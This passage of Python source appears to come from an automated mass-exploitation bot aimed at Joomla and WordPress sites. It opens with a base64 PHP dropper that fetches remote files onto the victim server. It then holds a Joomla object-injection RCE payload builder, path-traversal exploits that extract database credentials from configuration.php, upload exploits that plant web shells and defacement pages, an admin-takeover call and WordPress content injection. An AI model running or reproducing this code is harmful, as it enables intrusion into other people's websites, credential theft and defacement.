TjFjbXhmWTJ4dmMyVW9KR2x0S1RzTkNuME5DaVJqYUdWamF5QTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDNSdGNDOTJkV3h1TG5Cb2NDSWdPdzBLSkhSbGVIUWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMekEwZUM5SlEwY3RRWFYwYjBWNGNHeHZhWFJsY2tKdlZDOXRZWE4wWlhJdlptbHNaWE12ZFhBdWNHaHdKeWs3RFFva2IzQmxiaUE5SUdadmNHVnVLQ1JqYUdWamF5d2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaXdnSkhSbGVIUXBPdzBLWm1Oc2IzTmxLQ1J2Y0dWdUtUc05DbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXlrcGV3MEtJQ0FnSUdWamFHOGdKR05vWldOckxpSThMMkp5UGlJN0RRcDlaV3h6WlNBTkNpQWdaV05vYnlBaWJtOTBJR1Y0YVhSeklqc05DbVZqYUc4Z0ltUnZibVVnTGx4dUlDSWdPdzBLSkdOb1pXTnJNaUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbkJvY0NJZ093MEtKSFJsZUhReUlEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjbUYzTG1kcGRHaDFZblZ6WlhKamIyNTBaVzUwTG1OdmJTOHdOSGd2U1VOSExVRjFkRzlGZUhCc2IybDBaWEpDYjFRdmJXRnpkR1Z5TDJacGJHVnpMM1Z3TG5Cb2NDY3BPdzBLSkc5d1pXNHlJRDBnWm05d1pXNG9KR05vWldOck1pd2dKM2NuS1RzTkNtWjNjbWwwWlNna2IzQmxiaklzSUNSMFpYaDBNaWs3RFFwbVkyeHZjMlVvSkc5d1pXNHlLVHNOQ21sbUtHWnBiR1ZmWlhocGMzUnpLQ1JqYUdWamF6SXBLWHNOQ2lBZ0lDQmxZMmh2SUNSamFHVmphekl1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE15SWpzTkNtVmphRzhnSW1SdmJtVXlJQzVjYmlBaUlEc05DZzBLSkdOb1pXTnJNejBrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRJQzRnSWk5MmRXeHVMbWgwYlNJZ093MEtKSFJsZUhReklEMGdhSFIwY0Y5blpYUW9KMmgwZEhCek9pOHZjR0Z6ZEdWaWFXNHVZMjl0TDNKaGR5ODRPREIxWm1GWFJpY3BPdzBLSkc5d016MW1iM0JsYmlna1kyaGxZMnN6TENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0RNc0pIUmxlSFF6S1RzTkNtWmpiRzl6WlNna2IzQXpLVHNOQ2cwS0RRb2tZMmhsWTJzMlBTUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMMmx0WVdkbGN5OTJkV3h1TG1oMGJTSWdPdzBLSkhSbGVIUTJJRDBnYUhSMGNGOW5aWFFvSjJoMGRIQnpPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTg0T0RCMVptRlhSaWNwT3cwS0pHOXdOajFtYjNCbGJpZ2tZMmhsWTJzMkxDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNEWXNKSFJsZUhRMktUc05DbVpqYkc5elpTZ2tiM0EyS1RzTkNqOCsnKSk7DQpmY2xvc2UoJGZwMik7DQo=')")
            headers = {
                'User-Agent': pl
            }
            try:
                cookies = requests.get('http://' + site, headers=headers, timeout=5).cookies
            except:
                pass
            try:
                rr = requests.get('http://' + site + '/', headers=headers, cookies=cookies, timeout=5)
                if rr:
                    requests.get('http://' + site + '/images/vuln2.php', timeout=5)
                    requests.get('http://' + site + '/tmp/vuln2.php', timeout=5)
                    ShellCheck = requests.get('http://' + site + '/images/payload3.php', timeout=5)
                    ShellCheck2 = requests.get('http://' + site + '/tmp/payload3.php', timeout=5)
                    if 'Vuln!!' in ShellCheck.text:
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write('http://' + site + '/images/payload3.php' + '\n')
                        IndexCheck = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        IndexCheck2 = requests.get('http://' + site + '/images/br4in.htm', timeout=5)
                        if 'Vuln!!' in IndexCheck.text:
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write('http://' + site + '/br4in.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            self.Print_Vuln_index(site + '/images/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write('http://' + site + '/images/br4in.htm' + '\n')
                    elif 'Vuln!!' in ShellCheck2.text:
                        self.Print_vuln_Shell(site + '/tmp/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write('http://' + site + '/tmp/payload3.php' + '\n')
                        IndexCheck = requests.get('http://' + site + '/br4in.htm', timeout=5)
                        IndexCheck2 = requests.get('http://' + site + '/images/br4in.htm', timeout=5)
                        if 'Vuln!!' in IndexCheck.text:
                            self.Print_Vuln_index(site + '/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write('http://' + site + '/br4in.htm' + '\n')
                        elif 'Vuln!!' in IndexCheck2.text:
                            self.Print_Vuln_index(site + '/images/br4in.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write('http://' + site + '/images/br4in.htm' + '\n')
                    else:
                        self.Print_NotVuln('RCE Joomla', site)
                else:
                    self.Print_NotVuln('RCE Joomla', site)
            except:
                self.Print_NotVuln('RCE Joomla', site)
        except:
            self.Print_NotVuln('RCE Joomla', site)

    def php_str_noquotes(self, data):
        try:
            encoded = ""
            for char in data:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass

    def generate_payload(self, php_payload):
        try:
            php_payload = "eval({0})".format(php_payload)
            terminate = '\xf0\xfd\xfd\xfd';
            exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
            injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
            exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
            exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
            return exploit_template
        except:
            pass


    def Joomla_TakeADmin(self, site):
        try:
            GetVersion = requests.get('http://' + site + '/language/en-GB/en-GB.xml', timeout=5)
            if 'version="3.' in GetVersion.text.encode('utf-8'):
                os.system('python files/adminTakeover.py -u MArKAntoni -p MArKAntoni -e ' +
                          self.EMail + ' http://' + site)
        except:
            self.Print_NotVuln('Maybe Add Admin 3.x', site)

    def Com_s5_media_player(self, site):
        try:
            Exp = 'http://' + site + \
                  '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
            GetConfig = requests.get(Exp, timeout=5)
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("user = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("password = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("db = '(.*)';", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    pass
            else:
                self.Print_NotVuln('Com_s5_media_player', site)
        except:
            self.Print_NotVuln('Com_s5_media_player', site)

    def Com_Hdflvplayer(self, site):
        try:
            Exp = 'http://' + site + \
                  '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("user = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("password = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("db = '(.*)';", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    pass
            else:
                self.Print_NotVuln('Com_Hdflvplayer', site)
        except:
            self.Print_NotVuln('Com_Hdflvplayer', site)

    def Com_Joomanager(self, site):
        try:
            Exp = 'http://' + site + \
                  '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("user = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("password = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("db = '(.*)';", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_Joomanager', site)
            else:
                self.Print_NotVuln('Com_Joomanager', site)
        except:
            self.Print_NotVuln('Com_Joomanager', site)


    def Com_Macgallery(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("user = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("password = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("db = '(.*)';", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_Macgallery', site)
            else:
                self.Print_NotVuln('Com_Macgallery', site)
        except:
            self.Print_NotVuln('Com_Macgallery', site)

    def Com_CCkJseblod(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_cckjseblod&task=download&file=configuration.php'
            GetConfig = requests.get(Exp, timeout=5)
            if 'JConfig' in GetConfig.text.encode('utf-8'):
                self.Print_vuln_Config(site)
                with open('result/Config_results.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("host = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getuser = re.findall("user = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getpass = re.findall("password = '(.*)';", GetConfig.text.encode('utf-8'))
                    Getdb = re.findall("db = '(.*)';", GetConfig.text.encode('utf-8'))
                    with open('result/Config_results.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[1] + '\n' + ' user:  ' + Getuser[1] +
                             '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('Com_CCkjseblod', site)
            else:
                self.Print_NotVuln('Com_CCkjseblod', site)
        except:
            self.Print_NotVuln('Com_CCkjseblod', site)

    def Com_MyBlog(self, site):
        try:
            fileindex = {'fileToUpload': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/index.php?option=com_myblog&task=ajaxupload'
            GoT = requests.post(Exp, files=fileindex, timeout=5)
            if 'success' or 'File exists' in GoT.text.encode('utf-8'):
                if '/images/pwn' in GoT.text.encode('utf-8'):
                    IndeXpath = 'http://' + site + '/images/br4in.gif'
                else:
                    try:
                        GetPAth = re.findall("source: '(.*)'", GoT.text.encode('utf-8'))
                        IndeXpath = GetPAth[0]
                    except:
                        IndeXpath = 'http://' + site + '/images/br4in.gif'
                CheckIndex = requests.get(IndeXpath, timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/images/br4in.gif')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(IndeXpath + '\n')
                else:
                    self.Print_NotVuln('Com_MyBlog', site)
            else:
                self.Print_NotVuln('Com_MyBlog', site)
        except:
            self.Print_NotVuln('Com_MyBlog', site)

    def Com_Jdownloads_shell(self, site):
        try:
            fileindex = {'file_upload': (self.ZipJd, open(self.ZipJd, 'rb'), 'multipart/form-data'),
                         'pic_upload': (self.jdShell, open(self.jdShell, 'rb'), 'multipart/form-data')}
            post_data = {
                'name': 'ur name',
                'mail': 'TTTntsfT@aa.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
                'option': "com_jdownloads",
                'view': "upload"
            }
            Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
            Got = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '/upload_ok.png' in Got.text.encode('utf-8'):
                checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + self.jdShell.split('/')[1]
                Check = requests.get(checkUrl, timeout=5)
                if 'Vuln!!' in Check.text:
                    ChecksHell = requests.get('http://' + site + '/images/payload3.php', timeout=5)
                    CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                    if 'Vuln!!' in ChecksHell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_Jdownloads(site)
                else:
                    self.Com_Jdownloads(site)
            else:
                self.Com_Jdownloads(site)
        except:
            self.Com_Jdownloads(site)


    def Com_Jdownloads(self, site):
        try:
            fileindex = {'file_upload': (self.ZipJd, open(self.ZipJd, 'rb'),'multipart/form-data'),
                     'pic_upload': (self.Jce_Deface_image, open(self.Jce_Deface_image, 'rb'), 'multipart/form-data')}
            post_data = {
                'name': 'ur name',
                'mail': 'TTTnstT@aa.com',
                'catlist': '1',
                'filetitle': "lolz",
                'description': "<p>zot</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
                'option': "com_jdownloads",
                'view': "upload"
            }
            Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
            Got = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '/upload_ok.png' in Got.text.encode('utf-8'):
                checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + self.Jce_Deface_image.split('/')[1]
                Check = requests.get(checkUrl, timeout=5)
                if 'GIF89a' in Check.text:
                    self.Print_Vuln_index(site + '/images/jdownloads/screenshots/' +
                                          self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(checkUrl + '\n')
                else:
                    self.Print_NotVuln('Com_Jdownloads', site)
            else:
                self.Print_NotVuln('Com_Jdownloads', site)
        except:
            self.Print_NotVuln('Com_Jdownloads', site)


    def Com_Fabric(self, site):
        try:
            fileindex = {'userfile': (self.TextindeX1, open(self.TextindeX1, 'rb'), 'multipart/form-data')}
            post_data = {
                "name": "me.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
            Exp = 'http://' + site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
            requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            Check = requests.get('http://' + site + '/media/' + self.TextindeX1.split('/')[1])
            if 'Hacked' in Check.text:
                self.Print_Vuln_index(site + '/media/' + self.TextindeX1.split('/')[1])
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/media/' + self.TextindeX1.split('/')[1] + '\n')
            else:
                self.Print_NotVuln('Com_Fabric', site)
        except:
            self.Print_NotVuln('Com_Fabric', site)


    def Com_AdsManager(self, site):
        try:
            fileindex = {'file': open(self.Jce_Deface_image, 'rb')}
            post_data = {"name": self.Jce_Deface_image.split('/')[1]}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                Check = requests.get('http://' + site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1], timeout=5)
                if 'GIF89a' in Check.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_AdsManager', site)
        except:
            self.Print_NotVuln('Com_AdsManager', site)

    def Com_AdsManager_Shell(self, site):
        try:
            fileindex = {'file': open(self.indeX, 'rb')}
            post_data = {"name": "payload3.php"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5)
            if '"jsonrpc"' in GoT.text.encode('utf-8'):
                requests.post(Exp, files=fileindex, data={"name": "payload3.php"}, timeout=5)
                requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=5)
                Check = requests.get('http://' + site + '/tmp/plupload/payload3.php', timeout=5)
                Check2 = requests.get('http://' + site + '/tmp/plupload/payload3.php', timeout=5)
                Check3 = requests.get('http://' + site + '/tmp/plupload/vuln.phtml', timeout=5)
                CheckIndex = requests.get('http://' + site + '/br4in.htm', timeout=5)
                CheckShell = requests.get('http://' + site + '/images/payload3.php', timeout=5)

                if 'Vuln!!' in Check.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                elif 'Vuln!!' in Check2.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                elif 'Vuln!!' in Check3.text.encode('utf-8'):
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/images/payload3.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/images/payload3.php' + '\n')
                    if 'Vuln!!' in CheckIndex.text.encode('utf-8'):
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Com_AdsManager(site)
                else:
                    self.Com_AdsManager(site)
        except:
            self.Com_AdsManager(site)

    def JCE_shell(self, site):
        try:
            fileShell = {'Filedata': open(self._shell, 'rb')}
            post_data = {'upload-dir': '/', 'upload-overwrite': '0', 'action': 'upload'}
            Exp = 'http://' + site +\
                  '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
            Post = requests.post(Exp, files=fileShell, data=post_data, timeout=5)
            OtherMethod = '"text":"' + self._shell.split('/')[1] + '"'
            if OtherMethod in Post.text.encode('utf-8'):
                PrivMethod = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + self._shell.split('/')[1]
                                      + "\",\"./../../payload3.php\"]}"}
                try:
                    privExploit = 'http://' + site + '/index.php?option=com_jce&task=' \
                                                         'plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
                    requests.post(privExploit, data=PrivMethod, timeout=5)
                    try:
                        VulnCheck = requests.get('http://' + site + '/payload3.php', timeout=5)
                        if 'Vuln!!' in VulnCheck.text:
                            self.Print_vuln_Shell(site + '/payload3.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/payload3.php' + '\n')
                            self.Jce_Test(site)
                        else:
                            self.Jce_Test(site)
                    except:
                        self.Jce_Test(site)
                except:
                    self.Jce_Test(site)

            else:
                self.Jce_Test(site)
        except:
            self.Jce_Test(site)

    def Jce_Test(self, site):
        try:
            fileDeface = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            post_data = {'upload-dir': '../../', 'upload-overwrite': '0', 'action': 'upload'}
            Exp = 'http://' + site +\
                  '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
            Post = requests.post(Exp, files=fileDeface, data=post_data, timeout=5)
            OtherMethod = '"text":"' + self.Jce_Deface_image.split('/')[1] + '"'
            if OtherMethod in Post.text.encode('utf-8'):
                self.Print_Vuln_index(site + '/' + self.Jce_Deface_image.split('/')[1])
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/' + self.Jce_Deface_image.split('/')[1] + '\n')
            elif OtherMethod not in Post.text.encode('utf-8'):
                post_data2 = {'upload-dir': '../', 'upload-overwrite': '0', 'action': 'upload'}
                Post = requests.post(Exp, files=fileDeface, data=post_data2, timeout=5)
                if OtherMethod in Post.text.encode('utf-8'):
                    self.Print_Vuln_index(site + '/images/' + self.Jce_Deface_image.split('/')[1])
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/images/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_JCE', site)
            else:
                self.Print_NotVuln('Com_JCE', site)
        except:
            self.Print_NotVuln('Com_JCE', site)


    def alberghiExploit(self, site):
        try:
            fileDeface = {'userfile': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/administrator/components/com_alberghi/upload.alberghi.php'
            Check = requests.get(Exp, timeout=5)
            if 'class="inputbox" name="userfile"' in Check.text.encode('utf-8'):
                Post = requests.post(Exp, files=fileDeface, timeout=5)
                if 'has been successfully' or 'already exists' in Post.text.encode('utf-8'):
                    CheckIndex = requests.get(site + '/administrator/components/com_alberghi/' +
                                     self.Jce_Deface_image.split('/')[1], timeout=5)
                    if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/administrator/components/com_alberghi/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                        self.Print_Vuln_index(site + '/administrator/components/com_alberghi/' +
                                              self.Jce_Deface_image.split('/')[1])
                    else:
                        self.Print_NotVuln('com_alberghi', site)
                else:
                    self.Print_NotVuln('com_alberghi', site)
            else:
                self.Print_NotVuln('com_alberghi', site)
        except:
            self.Print_NotVuln('com_alberghi', site)

    def CateGory_page_icons(self, site):
        try:
            ChckVln = requests.get('http://' + site + '/wp-content/plugins/category-page-icons/css/menu.css', timeout=5)
            if ChckVln.status_code == 200:
                Exp = 'http://' + site + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php'
                fileDeface = {'wpdev-async-upload': open(self.Jce_Deface_image, 'rb')}
                PostDAta = {'dir_icons': '../../../',
                            'submit': 'upload'}
                requests.post(Exp, files=fileDeface, data=PostDAta, timeout=5)
                CheckIndex = requests.get('http://' + site + '/wp-content/' + self.Jce_Deface_image.split('/')[1], timeout=5)
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1] + '\n')
                    self.Print_Vuln_index(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1])
                else:
                    self.Print_NotVuln('CateGory_page_icons', site)
            else:
                self.Print_NotVuln('CateGory_page_icons', site)
        except:
            self.Print_NotVuln('CateGory_page_icons', site)


    def Downloads_Manager(self, site):
        try:
            Checkvuln = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/img/unlock.gif', timeout=5)
            if 'GIF89a' in Checkvuln.text.encode('utf-8'):
                PostDAta = {'dm_upload': ''}
                fileDeface = {'upfile': open(self.Jce_Deface_image, 'rb')}
                fileShell = {'upfile': open(self.pagelinesExploitShell, 'rb')}
                requests.post('http://' + site, data=PostDAta, files=fileDeface, timeout=5)
                CheckIndex = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                          self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text.encode('utf-8'):
                    requests.post('http://' + site, data=PostDAta, files=fileShell, timeout=5)
                    requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                 self.pagelinesExploitShell.split('/')[1], timeout=5)
                    CheckShell = requests.get('http://' + site + '/wp-content/payload3.php', timeout=5)
                    if 'Vuln!!' in CheckShell.text.encode('utf-8'):
                        self.Print_vuln_Shell(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.pagelinesExploitShell.split('/')[1])
                        self.Print_Vuln_index(site + '/br4in.htm')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.pagelinesExploitShell.split('/')[1] + '\n')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/br4in.htm' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.Jce_Deface_image.split('/')[1])
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Downloads-Manager', site)
            else:
                self.Print_NotVuln('Downloads-Manager', site)
        except:
            self.Print_NotVuln('Downloads-Manager', site)

    def GetWordpressPostId(self, zzz):
        try:
            PostId = requests.get('http://' + zzz + '/wp-json/wp/v2/posts/', timeout=5)
            wsx = re.findall('"id":(.+?),"date"', PostId.text)
            postid = wsx[1].strip()
            return postid
        except:
            pass

    def wp_content_injection(self, site):
        try:
            zaq = self.GetWordpressPostId(site)
            headers = {'Content-Type': 'application/json'}
            xxx = str(zaq) + 'bbx'
            data = json.dumps({
                'content': '<h1>Hacked by Cod3D Br4in\n<p><title>Vuln!! Path it now!!<br />\n</title></p></h1>\n',
                'title': 'Vuln!! Path it now!!',
                'id': xxx,
                'link': '/c-htm/',
                'slug': '"/c-htm/"'
            })
            GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data, headers=headers, timeout=10)
            if GoT:
                CheckIndex = 'http://' + site + '/c.htm'
                zcheck = requests.get(CheckIndex, timeout=10)
                if 'Vuln!!' in zcheck.text:
                    self.Print_Vuln_index(site + '/c.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/c.htm' + '\n')
                else:
                    self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
            else:
                self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
        except:
            self.Print_NotVuln('Wordpress 4.7 Content Injection', site)

    def Wp_Job_Manager(self, site):
        try:
            Exploit = '/jm-ajax/upload_file/'
            CheckVuln = requests.get('http://' + site + Exploit, timeout=5)
            if '"files":[]' in CheckVuln.text.encode('utf-8'):
                try:
                    IndeXfile = {'file[]': open(self.Jce_Deface_image, 'rb')}
                    GoT = requests.post('http://' + site + Exploit, files=IndeXfile, timeout=5)
                    GetIndeXpath = re.findall('"url":"(.*)"', GoT.text.encode('utf-8'))
